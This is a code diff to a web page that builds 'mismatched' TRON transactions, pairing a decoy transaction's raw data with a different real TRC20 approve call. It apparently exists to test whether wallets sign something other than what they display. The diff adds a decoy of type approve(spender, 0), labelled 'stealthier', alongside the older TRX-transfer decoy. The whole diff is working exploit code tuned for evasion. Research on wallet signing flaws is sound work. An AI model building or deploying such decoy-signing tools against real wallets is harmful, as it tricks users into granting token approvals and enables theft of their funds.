@@ -172,8 +172,14 @@
           </div>
 
           <div class="fields">
-            <label>Decoy recipient <input id="decoyTo" autocomplete="off" placeholder="defaults to current account" /></label>
-            <label>Decoy TRX <input id="decoyTrx" inputmode="decimal" value="0.01" /></label>
+            <label>Decoy type
+              <select id="decoyType">
+                <option value="approve0">approve(spender, 0) — same type, stealthier ✓</option>
+                <option value="transferTrx">sendTrx(decoyTo, amount) — cross-type (may be blocked)</option>
+              </select>
+            </label>
+            <label id="decoyToLabel" style="display:none">Decoy recipient <input id="decoyTo" autocomplete="off" placeholder="defaults to current account" /></label>
+            <label id="decoyTrxLabel" style="display:none">Decoy TRX <input id="decoyTrx" inputmode="decimal" value="0.01" /></label>
             <label>TRC20 contract <input id="tokenContract" autocomplete="off" placeholder="token contract address" /></label>
             <label>Approve spender <input id="spender" autocomplete="off" placeholder="defaults to current account" /></label>
             <label>Approve amount <input id="approveAmount" inputmode="numeric" value="1" /></label>
@@ -448,15 +454,30 @@
         const owner = toBase58(state.account || tronWeb.defaultAddress?.base58);
         if (!owner) throw new Error("Connect a TRON account first.");
 
-        const decoyTo = toBase58(requireAddress("decoyTo", owner, "Decoy recipient"));
-        const decoySun = trxToSun($("decoyTrx").value);
         const tokenContract = requireAddress("tokenContract", "", "TRC20 contract");
         const spender = toBase58(requireAddress("spender", owner, "Approve spender"));
         const approveAmount = integerText("approveAmount", "Approve amount");
         const feeLimit = Number(integerText("feeLimit", "Fee limit"));
         validateGuards(spender);
 
-        const decoyTx = await tronWeb.transactionBuilder.sendTrx(decoyTo, decoySun, owner);
+        let decoyTx;
+        const decoyType = $("decoyType").value;
+        if (decoyType === "transferTrx") {
+          const decoyTo = toBase58(requireAddress("decoyTo", owner, "Decoy recipient"));
+          const decoySun = trxToSun($("decoyTrx").value);
+          decoyTx = await tronWeb.transactionBuilder.sendTrx(decoyTo, decoySun, owner);
+        } else {
+          const decoyResult = await tronWeb.transactionBuilder.triggerSmartContract(
+            tokenContract,
+            "approve(address,uint256)",
+            { feeLimit, callValue: 0 },
+            [{ type: "address", value: spender }, { type: "uint256", value: 0 }],
+            owner
+          );
+          decoyTx = decoyResult.transaction || decoyResult;
+          if (!decoyTx?.raw_data) throw new Error("Decoy triggerSmartContract did not return raw_data.");
+        }
+
         const triggerResult = await tronWeb.transactionBuilder.triggerSmartContract(
           tokenContract,
           "approve(address,uint256)",
@@ -482,6 +503,7 @@
         state.signedTx = null;
         log("Mismatched transaction built", {
           txID: mismatchedTx.txID,
+          decoyType,
           rawDataType: decoyTx.raw_data?.contract?.[0]?.type,
           rawDataHexType: actualTx.raw_data?.contract?.[0]?.type,
           triggerResult: triggerResult.result
@@ -697,6 +719,11 @@
           "state.provider": { request: typeof state.provider?.request, sendTx: typeof state.provider?.sendTransaction }
         };
         log("Provider detection refreshed", { detections: state.detections, capabilities: caps });
+      });
+      $("decoyType").addEventListener("change", () => {
+        const isTransferTrx = $("decoyType").value === "transferTrx";
+        $("decoyToLabel").style.display = isTransferTrx ? "" : "none";
+        $("decoyTrxLabel").style.display = isTransferTrx ? "" : "none";
       });
       $("connectBtn").addEventListener("click", () => runButton("connectBtn", connectWallet));
       $("buildBtn").addEventListener("click", () => runButton("buildBtn", buildMismatch));
